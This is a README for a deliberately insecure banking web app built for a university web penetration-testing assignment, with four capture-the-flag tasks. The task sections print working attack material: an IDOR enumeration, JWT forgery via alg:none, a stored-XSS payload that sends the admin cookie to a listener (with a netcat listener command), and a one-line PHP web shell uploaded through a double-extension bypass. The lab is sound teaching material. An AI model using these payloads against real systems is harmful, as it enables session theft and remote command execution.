# FAMJIS BANK: INT406 Practice Lab

A deliberately vulnerable banking application for the INT406 Web Application
Penetration Testing assignment. It contains the four bugs you were shown in
class: IDOR, JWT manipulation, stored XSS, and file-upload to shell.

> **Warning:** this app is intentionally insecure. Run it only on your own
> machine. Never deploy it on the public internet or any shared server.

---

## 1. Requirements

- Docker and Docker Compose
- Your Burp Suite and the usual tools (curl, jwt_tool)

## 2. Run it

From this folder, start the lab with **your own matric number** as the id:

```bash
STUDENT_ID="2025/INT/11577" docker compose up --build
```

Then open: **http://localhost:8081**

Test customer login: `you` / `password123`

Your flags are generated from your `STUDENT_ID`, so they are unique to you.
Stop the lab with `Ctrl+C`, and remove it completely with
`docker compose down -v`.

## 3. The two containers

- **web** the bank itself, on port 8081.
- **adminbot** a headless browser that logs in as the branch admin and views
  the support messages every 30 seconds. You need this running for the XSS
  task. It is the heaviest part; if your machine struggles, you can still do
  the other three bugs with just the web container.

---

## 4. The four tasks

Find each bug, capture the flag, and write it up. Flags look like
`ICDFA{bug_xxxxxx}`.

### Task 1: IDOR
The account API returns any account by id, with no ownership check.
```bash
curl -H "Authorization: Bearer <your token>" http://localhost:8081/api/user/1023
curl -H "Authorization: Bearer <your token>" http://localhost:8081/api/user/1024
```
Your token is shown on your dashboard. Enumerate account ids and read the
`note` field. One account's note holds the flag.

### Task 2: JWT manipulation
The admin API trusts the `role` claim in your token, and the token is weakly
signed (it also accepts `alg:none`).
```bash
jwt_tool <your token>                 # inspect it
# forge role=admin (alg:none, or crack the HS256 secret), then:
curl -H "Authorization: Bearer <forged token>" http://localhost:8081/api/admin
```

### Task 3: Stored XSS to session theft
The support messages page renders your message without encoding, and the admin
session cookie is not HttpOnly. Start a listener on your host, then store a
payload that sends the admin's cookie to it when the admin bot views the page.
```bash
php -S 0.0.0.0:9000      # your collector (or: nc -lvnp 9000)
```
Payload (post it as a support message):
```html
<script>new Image().src='http://host.docker.internal:9000/c?k='+encodeURIComponent(document.cookie)</script>
```
When the admin bot visits, you receive its `session` cookie. Set that cookie in
your browser and open **http://localhost:8081/vault.php** to read the flag.

### Task 4: File upload to shell
The document upload only blocks names ending in `.php`, and the uploads folder
executes PHP. Upload a web shell using a bypass, then run a command.
```bash
# save as shell.php.jpg  (double extension bypass)
<?php system($_GET['c']); ?>
```
Upload it, then:
```bash
curl "http://localhost:8081/uploads/shell.php.jpg?c=cat%20/var/www/private/upload_flag.txt"
```

---

## 5. What to submit

See the assignment brief. In short: four flags plus four findings, one per bug,
each with reproduction steps and a screenshot showing your own id or flag.
